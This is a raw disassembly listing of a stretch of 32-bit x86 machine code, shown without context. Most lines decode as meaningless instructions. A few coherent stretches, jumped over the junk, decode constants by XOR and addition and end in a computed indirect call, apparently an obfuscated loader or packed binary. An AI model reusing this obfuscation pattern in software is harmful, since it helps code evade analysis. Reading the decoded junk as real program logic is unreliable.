  40d721:	out    0x84,eax
  40d723:	push   ss
  40d724:	(bad)  
  40d725:	mov    WORD PTR [esi+0x10],ds
  40d728:	and    ebx,0x7e7e8d05
  40d72e:	and    bh,BYTE PTR [edi+0x7e]
  40d731:	jle    0x40d77c
  40d733:	pop    edi
  40d734:	mov    ch,0xe0
  40d736:	(bad)  
  40d737:	push   ebx
  40d738:	mov    dh,0xd9
  40d73a:	pop    eax
  40d73b:	jp     0x40d6d8
  40d73d:	push   ebx
  40d73e:	cld    
  40d73f:	xor    cl,0xda
  40d742:	mov    WORD PTR [ecx-0x7cf60054],ss
  40d748:	ins    DWORD PTR es:[edi],dx
  40d749:	scas   al,BYTE PTR es:[edi]
  40d74a:	mov    bl,0x44
  40d74c:	es scas eax,DWORD PTR es:[edi]
  40d74e:	sti    
  40d74f:	sbb    al,0xda
  40d751:	and    BYTE PTR [esi+0x11],ah
  40d754:	aam    0xe6
  40d756:	sub    DWORD PTR [ebp+0x34],eax
  40d759:	repnz and al,0x62
  40d75c:	jge    0x40d735
  40d75e:	out    0x83,eax
  40d760:	(bad)  
  40d761:	mov    ch,0xe9
  40d763:	add    ecx,DWORD PTR [ebx+ebp*2+0x250c66d7]
  40d76a:	inc    edi
  40d76b:	push   ds
  40d76c:	pop    eax
  40d76d:	out    dx,al
  40d76e:	popa   
  40d76f:	inc    edi
  40d770:	adc    al,bh
  40d772:	xor    eax,0x7fd94769
  40d777:	int3   
  40d778:	je     0x40d740
  40d77a:	in     al,0xa6
  40d77c:	jbe    0x40d779
  40d77e:	mov    bh,0x86
  40d780:	pusha  
  40d781:	pushf  
  40d782:	inc    ecx
  40d783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d784:	mov    eax,0x3ade58ef
  40d789:	push   ebx
  40d78a:	pusha  
  40d78b:	(bad)  
  40d78c:	and    bl,cl
  40d78e:	add    DWORD PTR [ebp+0x23],ecx
  40d791:	rcr    BYTE PTR [ecx-0x1],0xa1
  40d795:	retf   
  40d796:	cmp    al,0xbe
  40d798:	outs   dx,BYTE PTR ds:[esi]
  40d799:	mov    bh,0xea
  40d79b:	fsub   QWORD PTR [ecx+0x76423965]
  40d7a1:	ins    BYTE PTR es:[edi],dx
  40d7a2:	cld    
  40d7a3:	jmp    0x4f9a6703
  40d7a8:	(bad)  
  40d7a9:	adc    al,bl
  40d7ab:	xchg   edx,eax
  40d7ac:	neg    BYTE PTR [ebx+ebp*4+0x36]
  40d7b0:	scas   al,BYTE PTR es:[edi]
  40d7b1:	scas   al,BYTE PTR es:[edi]
  40d7b2:	mov    ebx,0xf4efd3cd
  40d7b7:	sar    BYTE PTR [ebx-0x74],cl
  40d7ba:	cwde   
  40d7bb:	dec    eax
  40d7bc:	mov    ah,0xb5
  40d7be:	jo     0x40d80c
  40d7c0:	dec    edx
  40d7c1:	pop    es
  40d7c2:	adc    DWORD PTR [edi+edi*2-0x2f],edx
  40d7c6:	mov    ah,0xbb
  40d7c8:	(bad)  
  40d7c9:	mov    ds:0xbcdaa543,ax
  40d7cf:	dec    ecx
  40d7d0:	or     esi,DWORD PTR [edx-0x2c]
  40d7d3:	loopne 0x40d7c9
  40d7d5:	add    al,0x2
  40d7d7:	pop    ebp
  40d7d8:	sub    dh,BYTE PTR [eax+0x76]
  40d7db:	jns    0x40d7d4
  40d7dd:	jne    0x40d80d
  40d7df:	retf   0x4b2b
  40d7e2:	sub    BYTE PTR [eax-0x38d2fbaf],ah
  40d7e8:	push   esi
  40d7e9:	jmp    0xd69af201
  40d7ee:	cs push 0x57
  40d7f1:	jmp    0xf38ab8e
  40d7f6:	fld    DWORD PTR [edx+0x27]
  40d7f9:	fisttp QWORD PTR [ebp+0x75]
  40d7fc:	jg     0x40d85f
  40d7fe:	inc    edx
  40d7ff:	rcl    BYTE PTR [ebp+0xf],0xb6
  40d803:	jns    0x40d856
  40d805:	pop    ebx
  40d806:	popf   
  40d807:	mov    ebx,0xa0552913
  40d80c:	ret    0x6256
  40d80f:	mov    ebp,0xc8fdc235
  40d814:	neg    BYTE PTR [edi+0xa77040]
  40d81a:	sub    dh,BYTE PTR [edx-0x1d]
  40d81d:	push   0xfefdf80f
  40d822:	fcom   QWORD PTR [edx+0x194f8761]
  40d828:	clc    
  40d829:	std    
  40d82a:	je     0x40d7c9
  40d82c:	pop    ss
  40d82d:	sub    DWORD PTR [edx+0x6f],esp
  40d830:	inc    edi
  40d831:	(bad)  
  40d832:	mov    edi,0xee7964ec
  40d837:	or     DWORD PTR [ebx-0x6c],eax
  40d83a:	sub    BYTE PTR [ecx+0x4a],ah
  40d83d:	sub    eax,DWORD PTR [esi]
  40d83f:	jmp    0xc8d5:0x9976938d
  40d846:	sbb    al,0x29
  40d848:	(bad)  
  40d84a:	mov    cl,0xd6
  40d84c:	(bad)  
  40d84e:	xchg   esi,eax
  40d84f:	xor    ebp,DWORD PTR [edi+0x15]
  40d852:	jmp    0x8af1:0xaeab91a4
  40d859:	addr16 jnp 0x40d82d
  40d85c:	int3   
  40d85d:	mov    esi,0x49056a59
  40d862:	pop    ebx
  40d863:	xchg   ebx,ecx
  40d865:	sub    ebx,ecx
  40d867:	jmp    0x40d9b0
  40d86c:	adc    edx,DWORD PTR [edi+esi*2]
  40d86f:	jae    0x40d8e2
  40d871:	jno    0x40d886
  40d873:	je     0x40d880
  40d875:	(bad)  
  40d876:	adc    ecx,edx
  40d878:	ret    
  40d879:	sub    ebp,DWORD PTR [eax+0x7e8a299c]
  40d87f:	jle    0x40d8a3
  40d881:	jg     0x40d901
  40d883:	jle    0x40d8f4
  40d885:	nop
  40d886:	cli    
  40d887:	inc    edx
  40d888:	push   ss
  40d889:	sub    BYTE PTR [edi+0x29c7114a],ch
  40d88f:	pop    edx
  40d890:	in     al,dx
  40d891:	sub    DWORD PTR ds:0xbac3a029,ebx
  40d897:	mov    DWORD PTR [eax+0x76],edi
  40d89a:	sub    bh,BYTE PTR [ebp-0x2c3ec54e]
  40d8a0:	sahf   
  40d8a1:	or     al,0x2b
  40d8a3:	call   0xc2c4d7f9
  40d8a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8a9:	jns    0x40d8dc
  40d8ab:	mov    bh,BYTE PTR [ebx+0x7c]
  40d8ae:	dec    eax
  40d8af:	sahf   
  40d8b0:	dec    edx
  40d8b1:	inc    ecx
  40d8b2:	or     ebx,DWORD PTR [eax+0x1]
  40d8b5:	in     al,0x73
  40d8b7:	retf   0x4f95
  40d8ba:	dec    DWORD PTR [ebx+0x5a]
  40d8bd:	jecxz  0x40d8ce
  40d8bf:	mov    bl,0xe7
  40d8c1:	mov    edx,0xafe8d652
  40d8c6:	mov    al,0x10
  40d8c8:	inc    esp
  40d8c9:	call   0x1ba41e24
  40d8ce:	sbb    DWORD PTR ds:0x89182168,esp
  40d8d4:	test   BYTE PTR [edx+eax*1+0x6b],dl
  40d8d8:	inc    edi
  40d8d9:	shl    BYTE PTR [edx],cl
  40d8db:	ffreep st(5)
  40d8dd:	xor    al,BYTE PTR [esp+edi*8-0x7680594f]
  40d8e4:	mov    edx,0xb98c6e7e
  40d8e9:	iret   
  40d8ea:	ds stos BYTE PTR es:[edi],al
  40d8ec:	cld    
  40d8ed:	jno    0x40d90f
  40d8ef:	nop
  40d8f0:	in     al,dx
  40d8f1:	shl    BYTE PTR [esi-0x6b9e8b2b],0x54
  40d8f8:	mov    BYTE PTR [esi+eiz*8+0x5bbfc707],cl
  40d8ff:	pop    ecx
  40d900:	mov    ch,0xbd
  40d902:	pusha  
  40d903:	jns    0x40d979
  40d905:	shr    DWORD PTR [edi+0x70],cl
  40d908:	jo     0x40d8ca
  40d90a:	jg     0x40d8e0
  40d90c:	ficom  DWORD PTR ds:0xd515ecf5
  40d912:	or     cl,BYTE PTR [edx-0x75]
  40d915:	repnz ss inc ebx
  40d918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d919:	dec    BYTE PTR [ebp-0x33]
  40d91c:	adc    BYTE PTR [edx+0x1db6dcc5],dl
  40d922:	bndldx (bad),[ebp-0x2cb6b9ac]
  40d929:	dec    edx
  40d92a:	inc    esp
  40d92b:	ja     0x40d995
  40d92d:	or     BYTE PTR [ecx-0x4b85121f],0xa8
  40d934:	xchg   bl,cl
  40d936:	dec    esi
  40d937:	dec    ebp
  40d938:	das    
  40d939:	(bad)  
  40d93a:	inc    ecx
  40d93b:	sub    eax,0x24ba2538
  40d940:	sbb    BYTE PTR [esi+0x727c2c58],cl
  40d946:	dec    eax
  40d947:	(bad)  
  40d949:	into   
  40d94a:	push   cs
  40d94b:	or     bl,BYTE PTR [esi+esi*8]
  40d94e:	add    dl,BYTE PTR [ebx-0x4ca85787]
  40d954:	xchg   esi,eax
  40d955:	movups XMMWORD PTR ds:[esi-0x5eb9df1],xmm4
  40d95d:	cdq    
  40d95e:	sub    edi,eax
  40d960:	push   ebp
  40d961:	sub    ah,BYTE PTR [ebx-0x3b]
  40d964:	ret    
  40d965:	cmovl  ecx,DWORD PTR es:[edi]
  40d969:	pop    ebx
  40d96a:	pop    ds
  40d96b:	fs (bad) 
  40d96d:	ins    DWORD PTR es:[edi],dx
  40d96e:	xchg   edx,eax
  40d96f:	and    eax,0xb6786a29
  40d974:	dec    esp
  40d975:	pop    eax
  40d976:	sti    
  40d977:	dec    ebx
  40d978:	test   al,0x26
  40d97a:	ins    DWORD PTR es:[edi],dx
  40d97b:	cwde   
  40d97c:	jne    0x40d9f6
  40d97e:	and    ecx,edx
  40d980:	cdq    
  40d981:	mov    al,0x78
  40d983:	mov    esp,0x37e4641e
  40d988:	pusha  
  40d989:	ret    0xf92b
  40d98c:	(bad)  
  40d98d:	mov    ecx,0x31451cd9
  40d992:	lods   al,BYTE PTR ds:[esi]
  40d993:	in     al,dx
  40d994:	popw   es
  40d996:	and    dh,BYTE PTR [edi]
  40d998:	and    ebx,DWORD PTR [edx-0x77b95740]
  40d99e:	pop    es
  40d99f:	fcom   DWORD PTR [ebx]
  40d9a1:	out    dx,al
  40d9a2:	mov    edx,0xbd8898fa
  40d9a7:	push   edi
  40d9a8:	jno    0x40d95f
  40d9aa:	mov    edx,0xec0130c0
  40d9af:	add    BYTE PTR [edi+0x144e9cb],al
  40d9b5:	add    BYTE PTR [eax],al
  40d9b7:	mov    ebx,0xf146cba5
  40d9bc:	jo     0x40da11
  40d9be:	mov    eax,ds:0x3f48df24
  40d9c3:	repnz cmp bh,BYTE PTR [edi]
  40d9c6:	test   ebp,ebx
  40d9c8:	mov    edi,DWORD PTR [esi+0x7e]
  40d9cb:	and    bh,BYTE PTR [edi+0x7e]
  40d9ce:	jle    0x40da1c
  40d9d0:	dec    esp
  40d9d1:	push   eax
  40d9d2:	shrd   ebp,ebx,0x7a
  40d9d6:	and    esi,edi
  40d9d8:	into   
  40d9d9:	push   0x32dff9b
  40d9de:	out    0xa6,al
  40d9e0:	cmp    esi,DWORD PTR [ecx-0x36]
  40d9e3:	inc    ebp
  40d9e4:	ret    0xdc1
  40d9e7:	retf   0x2828
  40d9ea:	out    dx,al
  40d9eb:	(bad)  
  40d9ec:	push   ds
  40d9ed:	xor    DWORD PTR [esi+0x6402a779],eax
  40d9f3:	mov    bl,0x1
  40d9f5:	cmp    eax,0xe739ded9
  40d9fa:	ror    DWORD PTR [edx+0x4114e283],cl
  40da00:	test   eax,0xc860a3fb
  40da05:	(bad)  
  40da06:	mov    ebx,0x4e5d35ef
  40da0b:	mov    cl,0x1a
  40da0d:	jge    0x40d9d1
  40da0f:	loop   0x40d9f5
  40da11:	cmc    
  40da12:	jge    0x40d9c3
  40da14:	std    
  40da15:	pop    es
  40da16:	cmp    eax,0x8277da04
  40da1b:	dec    ebx
  40da1c:	bound  ebp,QWORD PTR [eax+0x5b]
  40da1f:	aad    0x15
  40da21:	or     eax,0x61ec841b
  40da26:	ins    DWORD PTR es:[edi],dx
  40da27:	xchg   esi,eax
  40da28:	adc    DWORD PTR [edi+0x7f3d9389],eax
  40da2e:	pop    esp
  40da2f:	fadd   st,st(0)
  40da31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da32:	or     ch,BYTE PTR [edi-0x6a3ebb3d]
  40da38:	cmovs  ecx,DWORD PTR [esi]
  40da3b:	adc    ebx,DWORD PTR [eax]
  40da3d:	adc    al,0xe1
  40da3f:	cld    
  40da40:	mov    al,0x1
  40da42:	icebp  
  40da43:	out    0xd5,eax
  40da45:	push   0xffffffaf
  40da47:	nop
  40da48:	out    dx,eax
  40da49:	pop    ecx
  40da4a:	in     eax,dx
  40da4b:	xlat   BYTE PTR ds:[ebx]
  40da4c:	js     0x40da8e
  40da4e:	add    DWORD PTR [eax-0x77e737f6],0xc1c6fdb0
  40da58:	nop
  40da59:	jle    0x40da38
  40da5b:	pop    esp
  40da5c:	and    ah,ah
  40da5e:	pop    ds
  40da5f:	rcl    ecx,0xe8
  40da62:	mov    esi,0xa624b4c5
  40da67:	addr16 xchg edx,eax
  40da69:	(bad)  
  40da6a:	lahf   
  40da6b:	add    al,0xc9
  40da6d:	mov    esi,0x4364a242
  40da72:	jb     0x40da83
  40da74:	xchg   eax,eax
  40da76:	fadd   st,st(3)
  40da78:	cmc    
  40da79:	cmp    al,0x71
  40da7b:	lahf   
  40da7c:	sbb    BYTE PTR [edi-0x73c780bd],dl
  40da82:	fdiv   DWORD PTR [edx]
  40da84:	xor    DWORD PTR [esi+esi*2-0x1e],0x762441d3
  40da8c:	test   eax,0x10f31216
  40da91:	jmp    0x40dab8
  40da93:	fld    QWORD PTR [edx-0x2b]
  40da96:	int3   
  40da97:	mov    eax,ds:0xe3a7f37c
  40da9c:	mov    bh,0x62
  40da9e:	sbb    edx,DWORD PTR [ecx+0xe]
  40daa1:	jle    0x40dac2
  40daa3:	inc    edx
  40daa4:	lea    eax,[ecx-0x2b84bd3]
  40daaa:	adc    dl,BYTE PTR [eax+edi*4+0x645e95cd]
  40dab1:	and    ecx,DWORD PTR [ecx+edx*8-0x1031b9bf]
  40dab8:	push   0xae1e30bf
  40dabd:	xor    al,BYTE PTR [eax-0x14]
  40dac0:	icebp  
  40dac1:	jecxz  0x40daf0
  40dac3:	push   ds
  40dac4:	out    0x8,al
  40dac6:	fadd   DWORD PTR [esi+0x11285fae]
  40dacc:	es test al,0xf5
  40dacf:	(bad)  
  40dad0:	shl    DWORD PTR [edi],cl
  40dad2:	jmp    0x70de:0x23ca95c6
  40dad9:	cmp    BYTE PTR [edi+0x3a],cl
  40dadc:	xor    edx,DWORD PTR [esi+0x359bf9e6]
  40dae2:	retf   
  40dae3:	xor    eax,0x353385fa
  40dae8:	dec    ebx
  40dae9:	jp     0x40db3d
  40daeb:	or     eax,0x20d219d
  40daf0:	test   edx,eax
  40daf2:	cmovae ecx,DWORD PTR [edx]
  40daf5:	xchg   esp,eax
  40daf6:	jg     0x40da9f
  40daf8:	fwait
  40daf9:	pop    es
  40dafa:	add    al,0x49
  40dafc:	mov    eax,DWORD PTR [ebp-0x1c]
  40daff:	imul   eax,ecx
  40db02:	sub    esp,eax
  40db04:	mov    DWORD PTR [ebp-0x24],esp
  40db07:	mov    eax,DWORD PTR [ebp-0x4]
  40db0a:	mov    ecx,0x7510854
  40db0f:	xor    eax,ecx
  40db11:	mov    edx,0x32729b
  40db16:	add    eax,edx
  40db18:	mov    DWORD PTR [ebp+0x8],eax
  40db1b:	mov    eax,DWORD PTR [ebp-0x18]
  40db1e:	xor    eax,ecx
  40db20:	jmp    0x40dc69
  40db25:	fsub   DWORD PTR [edx+0x35701da8]
  40db2b:	imul   esp,DWORD PTR [ebx+0x3b],0x2ab6fdf0
  40db32:	cdq    
  40db33:	mov    cl,0x1d
  40db35:	or     DWORD PTR [eax+0x7f227e7e],0x95c97e7e
  40db3f:	(bad)  
  40db40:	test   BYTE PTR [ecx],0x85
  40db43:	mov    dl,0x25
  40db45:	sbb    DWORD PTR ds:0x8d86eec7,ecx
  40db4b:	jae    0x40db4c
  40db4d:	dec    esi
  40db4e:	push   ss
  40db4f:	jae    0x40dad6
  40db51:	(bad)  
  40db52:	(bad)  
  40db53:	fmul   DWORD PTR [edi]
  40db55:	mov    al,0x99
  40db57:	in     al,0xb4
  40db59:	mov    ebx,0xdaa7c50b
  40db5e:	mov    esi,0xd92a4d28
  40db63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db64:	fidivr DWORD PTR [ebp+0x7f]
  40db67:	out    0xd8,al
  40db69:	lds    esi,FWORD PTR [eax]
  40db6b:	daa    
  40db6c:	jle    0x40db85
  40db6e:	adc    ecx,DWORD PTR [edi+0x53771616]
  40db74:	loop   0x40db2c
  40db76:	fs inc esp
  40db78:	ja     0x40db83
  40db7a:	xchg   edi,eax
  40db7b:	ret    0xfeb4
  40db7e:	jo     0x40db89
  40db80:	mov    esi,0x2f186297
  40db85:	inc    esi
  40db86:	pop    ecx
  40db87:	ins    BYTE PTR es:[edi],dx
  40db88:	push   es
  40db89:	(bad)
  40db8d:	dec    edx
  40db8e:	xor    ecx,ebp
  40db90:	adc    al,0x26
  40db92:	jecxz  0x40dbbe
  40db94:	cld    
  40db95:	repnz sbb al,0xb
  40db98:	sub    esp,DWORD PTR [esi+0x3ff51636]
  40db9e:	pop    ebx
  40db9f:	mov    al,ds:0xff560aee
  40dba4:	pusha  
  40dba5:	xor    BYTE PTR [ecx+0x68],0x7
  40dba9:	xor    eax,0xc7af9c6f
  40dbae:	or     esp,DWORD PTR [ebx+0x2]
  40dbb1:	les    ecx,FWORD PTR [esi+edx*4-0x3484b85d]
  40dbb8:	inc    eax
  40dbb9:	adc    dl,bh
  40dbbb:	xor    dh,al
  40dbbd:	pushf  
  40dbbe:	je     0x40db78
  40dbc0:	cmp    al,0x7f
  40dbc2:	popa   
  40dbc3:	les    eax,FWORD PTR [edx+0x4a6535a2]
  40dbc9:	or     al,0x2d
  40dbcb:	push   cs
  40dbcc:	mov    ecx,0x429944d1
  40dbd1:	add    al,ch
  40dbd3:	jecxz  0x40dbf0
  40dbd5:	cwde   
  40dbd6:	shl    DWORD PTR [edi],1
  40dbd8:	jge    0x40dbf7
  40dbda:	out    0x6b,eax
  40dbdc:	jo     0x40dbc5
  40dbde:	jecxz  0x40dbd2
  40dbe0:	jo     0x40dbb7
  40dbe2:	test   BYTE PTR ds:0x4183b89d,0xf4
  40dbe9:	imul   edi,edi,0xffffffa1
  40dbec:	cmp    esp,ebx
  40dbee:	inc    ecx
  40dbef:	mov    ds:0x37bdc352,al
  40dbf4:	dec    eax
  40dbf5:	push   esi
  40dbf6:	mov    cl,0x80
  40dbf8:	(bad)  
  40dbf9:	bound  eax,QWORD PTR [esi+edx*2-0x6d]
  40dbfd:	pushf  
  40dbfe:	push   ebp
  40dbff:	int3   
  40dc00:	mov    ds:0x5d7d0c64,eax
  40dc05:	jns    0x40dbf4
  40dc07:	push   ds
  40dc08:	pop    edi
  40dc09:	pop    ebx
  40dc0a:	popf   
  40dc0b:	mov    dh,0xc9
  40dc0d:	cmc    
  40dc0e:	iret   
  40dc0f:	dec    edi
  40dc10:	mov    edi,0x57535ff3
  40dc15:	inc    esi
  40dc16:	xor    cl,BYTE PTR [ecx+0x36]
  40dc19:	jmp    0xf0e6e301
  40dc1e:	pop    ebp
  40dc1f:	enter  0x9e25,0xe8
  40dc23:	adc    edx,DWORD PTR [esi-0x4a]
  40dc26:	repnz fadd DWORD PTR [eax+eax*8]
  40dc2a:	xor    BYTE PTR ds:[ebx-0x70],bl
  40dc2e:	outs   dx,BYTE PTR ds:[esi]
  40dc2f:	xor    al,BYTE PTR [ebx]
  40dc31:	es jmp 0x41a3389
  40dc37:	pop    esp
  40dc38:	mov    ds:0x5a8c5282,eax
  40dc3d:	fldcw  WORD PTR [edx]
  40dc3f:	adc    BYTE PTR [edx+ecx*2],dl
  40dc42:	or     edx,DWORD PTR [esi]
  40dc44:	inc    esp
  40dc45:	adc    al,0x7
  40dc47:	push   ebp
  40dc48:	cmc    
  40dc49:	dec    ebx
  40dc4a:	loopne 0x40dc91
  40dc4c:	imul   esp,esp,0xffffff83
  40dc4f:	fdivp  st(0),st
  40dc51:	sub    edi,DWORD PTR [ecx]
  40dc53:	retf   0xf3a9
  40dc56:	das    
  40dc57:	in     al,0x75
  40dc59:	aad    0x6
  40dc5b:	mov    al,ds:0xf16f7d61
  40dc60:	xor    ebp,DWORD PTR [ecx-0x75]
  40dc63:	push   es
  40dc64:	fadd   st,st(7)
  40dc66:	inc    eax
  40dc67:	mov    eax,ds:0x8bc2035e
  40dc6c:	push   ebp
  40dc6d:	adc    al,0xf
  40dc6f:	scas   eax,DWORD PTR es:[edi]
  40dc70:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40dc76:	mov    ecx,DWORD PTR [ebp+0x8]
  40dc79:	lea    ecx,[edx+ecx*1+0x32729b]
  40dc80:	cmp    ecx,eax
  40dc82:	je     0x40de42
  40dc88:	mov    edi,DWORD PTR [ebp-0x18]
  40dc8b:	mov    eax,DWORD PTR [ebp+0x8]
  40dc8e:	mov    edx,DWORD PTR [ebp+0x14]
  40dc91:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40dc95:	mov    ecx,0x7510854
  40dc9a:	xor    edx,edx
  40dc9c:	xor    edi,ecx
  40dc9e:	mov    esi,0x32729b
  40dca3:	add    edi,esi
  40dca5:	div    edi
  40dca7:	mov    edx,DWORD PTR [ebp-0x4]
  40dcaa:	xor    edx,ecx
  40dcac:	lea    eax,[edx+eax*1+0x32729b]
  40dcb3:	mov    edx,DWORD PTR [ebp+0x8]
  40dcb6:	mov    edi,DWORD PTR [ebp-0x24]
  40dcb9:	mov    DWORD PTR [edi+edx*4],eax
  40dcbc:	mov    eax,DWORD PTR [ebp-0x18]
  40dcbf:	mov    edx,DWORD PTR [ebp+0x8]
  40dcc2:	xor    eax,ecx
  40dcc4:	lea    eax,[eax+edx*1+0x32729b]
  40dccb:	jmp    0x40de14
  40dcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	and    eax,0xb1913513
  40dcd7:	stos   DWORD PTR es:[edi],eax
  40dcd8:	jp     0x40dc9c
  40dcda:	mov    ch,0x9b
  40dcdc:	add    edx,eax
  40dcde:	xor    eax,0x7e89b5c1
  40dce3:	jle    0x40dd07
  40dce5:	jg     0x40dd65
  40dce7:	jle    0x40dc98
  40dce9:	or     BYTE PTR [edx-0x3b],ah
  40dcec:	fs test ch,0xa4
  40dcf0:	pop    eax
  40dcf1:	mov    bl,0x6f
  40dcf3:	add    al,0x31
  40dcf5:	or     bh,dh
  40dcf7:	imul   edx,DWORD PTR [edi+0x72f5be95],0xaa30938
  40dd01:	pop    ecx
  40dd02:	adc    ch,bh
  40dd04:	ror    DWORD PTR [edx],cl
  40dd06:	cld    
  40dd07:	xor    DWORD PTR [ecx+eax*1+0x3fbc2f99],esp
  40dd0e:	clc    
  40dd0f:	int    0x8
  40dd11:	ret    0x49e3
  40dd14:	mov    ebp,0x558d7709
  40dd19:	pop    esi
  40dd1a:	or     DWORD PTR [edi-0x56],ecx
  40dd1d:	cs shl esi,0x32
  40dd21:	cmp    al,BYTE PTR [ecx-0x75]
  40dd24:	jmp    0x9f48:0xdd7c65c8
  40dd2b:	addr16 push 0x293aca3f
  40dd31:	int3   
  40dd32:	or     bl,ch
  40dd34:	cwde   
  40dd35:	adc    cl,0x6e
  40dd38:	rcr    DWORD PTR [edi],cl
  40dd3a:	call   0x98582088
  40dd3f:	sti    
  40dd40:	dec    edi
  40dd41:	xchg   edx,eax
  40dd42:	mov    ch,ch
  40dd44:	jmp    0x1c2fbd8d
  40dd49:	imul   DWORD PTR [edx+0x3b60127b]
  40dd4f:	lds    ecx,FWORD PTR [ecx+0x2f]
  40dd52:	pop    ecx
  40dd53:	add    BYTE PTR [edx+0x13a4c680],ch
  40dd59:	jp     0x40dd60
  40dd5b:	push   edi
  40dd5c:	leave  
  40dd5d:	sar    DWORD PTR [ebx-0xbf3aa53],1
  40dd63:	jg     0x40dd2f
  40dd65:	push   edx
  40dd66:	icebp  
  40dd67:	jmp    0x7f042a6a
  40dd6c:	sbb    eax,0x28b7565d
  40dd71:	mov    edx,0x4fb729b5
  40dd76:	push   0x85469bcc
  40dd7b:	in     eax,0x7a
  40dd7d:	adc    DWORD PTR [edi+ebp*4],edx
  40dd80:	(bad)
  40dd84:	scas   al,BYTE PTR es:[edi]
  40dd85:	mov    eax,es:0x6ce11a38
  40dd8b:	sub    eax,0xe8e35d70
  40dd90:	jge    0x40ddd3
  40dd92:	iret   
  40dd93:	pusha  
  40dd94:	outs   dx,BYTE PTR ds:[esi]
  40dd95:	lds    esp,FWORD PTR [ebx-0x77d57142]
  40dd9b:	enter  0x7573,0x18
  40dd9f:	mov    ebp,0x35d41952
  40dda4:	cmp    BYTE PTR [ebx-0x1c5e22a7],bh
  40ddaa:	xchg   edx,eax
  40ddab:	je     0x40de16
  40ddad:	into   
  40ddae:	scas   al,BYTE PTR es:[edi]
  40ddaf:	lahf   
  40ddb0:	dec    ecx
  40ddb1:	push   eax
  40ddb2:	popa   
  40ddb3:	addr16 ds jge 0x40ddec
  40ddb7:	scas   eax,DWORD PTR es:[edi]
  40ddb8:	in     eax,dx
  40ddb9:	in     eax,dx
  40ddba:	dec    edx
  40ddbb:	mov    esi,0xebe09aa9
  40ddc0:	mov    eax,ds:0xd6cbe632
  40ddc5:	fsubr  DWORD PTR [ebp+0xe4d5b72]
  40ddcb:	ss push esp
  40ddcd:	loope  0x40ddc3
  40ddcf:	cmp    ah,dh
  40ddd1:	xchg   ch,bh
  40ddd3:	xchg   ecx,eax
  40ddd4:	jnp    0x40dd71
  40ddd6:	jecxz  0x40ddf1
  40ddd8:	mov    cl,0x2d
  40ddda:	hlt    
  40dddb:	or     dh,BYTE PTR [ebx-0x487f8524]
  40dde1:	mov    ah,0x48
  40dde3:	lahf   
  40dde4:	retf   
  40dde5:	jmp    0x99c8:0x52cbbc7c
  40ddec:	dec    edi
  40dded:	xchg   edx,eax
  40ddee:	cmp    bh,dl
  40ddf0:	push   0x16
  40ddf2:	push   ds
  40ddf3:	add    eax,0xc762c732
  40ddf8:	sbb    edx,edx
  40ddfa:	lea    ebp,[ecx+0x43]
  40ddfd:	mov    bh,0xb3
  40ddff:	lock nop
  40de01:	pop    ebx
  40de02:	jno    0x40ddf5
  40de04:	popa   
  40de05:	fld    TBYTE PTR [edx-0x5f5ff2ee]
  40de0b:	xchg   edx,eax
  40de0c:	mov    DWORD PTR [edx],edx
  40de0e:	pop    ebp
  40de0f:	ret    
  40de10:	jno    0x40dddb
  40de12:	jg     0x40dda0
  40de14:	mov    DWORD PTR [ebp+0x8],eax
  40de17:	mov    eax,DWORD PTR [ebp-0x18]
  40de1a:	mov    edx,DWORD PTR [ebp+0x14]
  40de1d:	xor    eax,ecx
  40de1f:	add    eax,esi
  40de21:	imul   eax,DWORD PTR [edx]
  40de24:	mov    edx,DWORD PTR [ebp-0x4]
  40de27:	xor    edx,ecx
  40de29:	mov    ecx,DWORD PTR [ebp+0x8]
  40de2c:	lea    ecx,[edx+ecx*1+0x32729b]
  40de33:	cmp    ecx,eax
  40de35:	jne    0x40dc88
  40de3b:	mov    ebx,esi
  40de3d:	jmp    0x40de47
  40de42:	mov    ebx,0x32729b
  40de47:	mov    eax,DWORD PTR [ebp-0x4]
  40de4a:	xor    eax,0x7510854
  40de4f:	add    eax,ebx
  40de51:	mov    DWORD PTR [ebp-0xc],eax
  40de54:	xor    ebx,ebx
  40de56:	lea    eax,[ebp-0x10]
  40de59:	add    ebx,DWORD PTR [eax]
  40de5b:	call   ebx
  40de5d:	xor    ebx,ebx
  40de5f:	inc    ebx
  40de60:	cmp    DWORD PTR [ebp+0x10],ebx
  40de63:	je     0x40dfca
  40de69:	xchg   edx,eax
  40de6a:	push   0xa
  40de6c:	pop    ecx
  40de6d:	push   0x4
  40de6f:	pop    ebx
  40de70:	jmp    0x40dfb9
  40de75:	call   0x7013:0x71175975
  40de7c:	jno    0x40de7d
  40de7e:	ins    DWORD PTR es:[edi],dx
  40de7f:	add    BYTE PTR [edx-0x14b1a74],al
  40de85:	pop    ecx
  40de86:	xchg   esi,eax
  40de87:	jle    0x40df07
  40de89:	and    bh,BYTE PTR [edi+0x7e]
  40de8c:	jle    0x40defc
  40de8e:	jmp    0xc4d49231
  40de93:	xchg   BYTE PTR [ebx-0x29],al
  40de96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de97:	sub    eax,0x967790b7
  40de9c:	mov    ch,0x34
  40de9e:	inc    ebp
  40de9f:	cmp    eax,ecx
  40dea1:	lds    ebx,FWORD PTR [ebx+0x5ef3a06a]
  40dea7:	inc    edi
  40dea8:	mov    edi,0xd5c8e803
  40dead:	lahf   
  40deae:	(bad)  
  40deb0:	shl    DWORD PTR [eax],cl
  40deb2:	jg     0x40ded9
  40deb4:	ins    BYTE PTR es:[edi],dx
  40deb5:	mov    dl,0x42
  40deb7:	ss es pop ds
  40deba:	mov    dl,BYTE PTR [esi-0x35]
  40debd:	jnp    0x40dea2
  40debf:	mov    WORD PTR [esi-0x4126f788],?
  40dec5:	mov    DWORD PTR [ebx+0x52],esp
  40dec8:	mov    edx,edi
  40deca:	and    DWORD PTR [ebx-0xc101fe2],esi
  40ded0:	call   0x17658cfc
  40ded5:	pop    ebp
  40ded6:	cmp    bl,ah
  40ded8:	aas    
  40ded9:	ret    
  40deda:	imul   ebx,DWORD PTR [edx],0xffffffeb
  40dedd:	xchg   DWORD PTR [ebp-0x6eabe8ef],ebp
  40dee3:	push   esp
  40dee4:	push   ss
